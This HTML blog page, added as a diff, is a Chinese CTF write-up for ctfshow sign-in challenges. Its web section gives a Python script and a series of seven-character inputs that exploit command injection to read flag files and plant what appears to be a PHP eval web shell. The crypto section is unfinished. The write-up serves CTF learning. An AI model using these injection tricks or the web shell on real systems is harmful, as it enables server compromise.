@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="RpWn" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      ctfshow单身杯签到 
+      
+      
+      |
+    
+     RpWn
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/2.png">
+    <link rel="icon" href="/images/2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">𝙍𝙥𝙒𝙣</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ctfshow单身杯签到</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2022-09-18 20:24:47
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF-wp/" title="CTF_wp">
+                    <b>#</b> CTF_wp
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CTF/" title="CTF">
+                    #CTF
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/CTFshow-%E4%B8%83%E5%A4%95%E6%9D%AF/" title="CTFshow_七夕杯">
+                    #CTFshow_七夕杯
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p><em><strong>欢迎来到TTRR blog，本篇分享的是我CTF做题过程的个人心得wp</strong></em></p>
+<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><p>在末尾处我们发现了js代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isSafe</span>(<span class="params">cmd</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> cmd.<span class="property">length</span>&lt;=<span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不难判断长度限制为七位</span></span><br></pre></td></tr></table></figure>
+
+<p>执行py脚本RCE</p>
+<blockquote>
+<p>注释为个人理解</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e51a220b-8df4-45fa-a1d0-6d7f9f693e59.challenge.ctf.show/&quot;</span>  <span class="comment"># 需要自行替换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getShell</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    file = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: <span class="string">b&quot;#!/bin/sh\ncat /f*&gt;/var/www/html/1.txt&quot;</span></span><br><span class="line">    &#125;  <span class="comment"># 这个是可执行所以要加#！不然会报错,后面跟着指定的目录 然后/n换行，cat就是打印 f*匹配f开头的文件 然后打印所有f开头的文件</span></span><br><span class="line">    <span class="comment"># 重定向到这里/var/www/html/1.txt。这个/var/www/html/1.txt是linux默认网站存在的一个目录</span></span><br><span class="line">    <span class="comment"># 这里的#！后面要指定绝对路径，因为它是不会自动到&amp;PATH中寻找解释器</span></span><br><span class="line">    response = requests.post(url=url + <span class="string">&quot;api/tools.php&quot;</span>, files=file, data=data)  <span class="comment"># 这里的requests.post是要传入了（. /t*/*）参数</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;t*&quot;</span> <span class="keyword">in</span> response.text:  <span class="comment"># 判断传入的参数（. /t*/*）也由于没有成功</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;执行成功，检查回显...&quot;</span>)  <span class="comment"># 成功提示这句话</span></span><br><span class="line">    response = requests.get(url=url + <span class="string">&quot;1.txt&quot;</span>)  <span class="comment"># 这句话的意思是获取1.txt内容</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果我们上传参数（. /t*/*）成功，并且访问网页+1.txt响应为200....(200的意思就是正常访问成功)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag 获取成功 &quot;</span> + response.text)  <span class="comment"># 访问成功后返回内容，这个内容包含了flag，所有我们打印出来就可以看见</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag 获取失败&quot;</span>)  <span class="comment"># 如果不是响应不是200代表失败即告诉你flag获取失败</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():  <span class="comment"># 定义函数run（）执行下面代码</span></span><br><span class="line">    getShell(<span class="string">&quot;. /t*/*&quot;</span>)  <span class="comment"># 代码的意思是把目录所有文件当sh执行，执行的话就会记录下flag并回显</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  <span class="comment"># 这是一个模块具体可以查文档有说明</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>还有应该办法就是一个个输入框内执行，详情如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>需要理解这道题的精华就是七字符限制rce，这种题我也解释不出个所以然，但是可以参考ctfshow哔哩哔哩</p>
+</blockquote>
+<iframe height="500px" width="100%" src="//player.bilibili.com/player.html?aid=896536576&cid=719143574&page=1&high_quality=1" scrolling="no" border="0" frameborder="no" framespacing="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts" alt="ctfshow官方视频" title="点击放大">
+> CTFshow视频</iframe>
+
+<h2 id="CRYPTO签到"><a href="#CRYPTO签到" class="headerlink" title="CRYPTO签到"></a>CRYPTO签到</h2><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">大牛在今年的hvv过程中，渗透进某业务系统，发现了密文,可是不知道如何解出明文，你能帮他找出来吗？</span><br><span class="line"></span><br><span class="line">已知密文由两部分组成，后面的推测为秘钥</span><br><span class="line"></span><br><span class="line">密文如下：</span><br><span class="line"></span><br><span class="line">y3rmc2hvd3tjcnlwdg9fc2lnbmlux2lzx2vhc3l9-a0004008a0</span><br></pre></td></tr></table></figure>
+<h3 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h3><blockquote>
+<p>密文：<br>y3rmc2hvd3tjcnlwdg9fc2lnbmlux2lzx2vhc3l9<br>后面跟着的可能是密钥<br>为什么这么说呢？</p>
+</blockquote>
+<img src="/images/loading.gif" data-original="https://s1.328888.xyz/2022/09/18/oeULy.png" alt="整串无法解密" title="点击放大">
+<img src="/images/loading.gif" data-original="https://s1.328888.xyz/2022/09/18/orEQi.png" alt="去掉后面可以解密" title="点击放大">
+
+<p>但是解密结果有问题<strong>�z�show{crypv_signin�is�k�sy}</strong><br>我们运行一下ciphey试试看其他的</p>
+<blockquote>
+<p>啊哈哈 我电脑出了点毛病还没安装ciphey等我明天安装好 再次更新吧</p>
+</blockquote>
+<h2 id="OSINT签到"><a href="#OSINT签到" class="headerlink" title="OSINT签到"></a>OSINT签到</h2><h2 id="RE签到"><a href="#RE签到" class="headerlink" title="RE签到"></a>RE签到</h2><h2 id="MISC签到"><a href="#MISC签到" class="headerlink" title="MISC签到"></a>MISC签到</h2><h2 id="PWN签到"><a href="#PWN签到" class="headerlink" title="PWN签到"></a>PWN签到</h2>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/09/16/%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2022-09-18 20:24:47
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF-wp/" title="CTF_wp">
+                        <b>#</b> CTF_wp
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CTF/" title="CTF">
+                        #CTF
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/CTFshow-%E4%B8%83%E5%A4%95%E6%9D%AF/" title="CTFshow_七夕杯">
+                        #CTFshow_七夕杯
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/10/19/eNSP%E5%8D%8E%E4%B8%BA%E6%A8%A1%E6%8B%9F%E5%99%A8/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B0"><span class="toc-text">web签到</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-text">审计代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO%E7%AD%BE%E5%88%B0"><span class="toc-text">CRYPTO签到</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="toc-text">分析题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">获取信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT%E7%AD%BE%E5%88%B0"><span class="toc-text">OSINT签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE%E7%AD%BE%E5%88%B0"><span class="toc-text">RE签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC%E7%AD%BE%E5%88%B0"><span class="toc-text">MISC签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN%E7%AD%BE%E5%88%B0"><span class="toc-text">PWN签到</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'Q7wVyjYPuqI74Po9PkIA7H7r-9Nh9j0Va',
+        appKey: 'Ez8qn5ou4x3tqLWTHjppUIpW',
+        placeholder: 'Welcome!😃😃😃 Please enter the correct email address!!!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" href="">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E7%AD%BE%E5%88%B0 + '&url=' + https%3A%2F%2Fttrrh.github.io%2F2022%2F09%2F18%2F%25C2%2596CTFshow%25E5%258D%2595%25E8%25BA%25AB%25E6%259D%25AF%25E7%25AD%25BE%25E5%2588%25B0%25E7%25BB%2584%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ttrrh.github.io/2022/09/18/%C2%96CTFshow%E5%8D%95%E8%BA%AB%E6%9D%AF%E7%AD%BE%E5%88%B0%E7%BB%84/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body>
+</html>
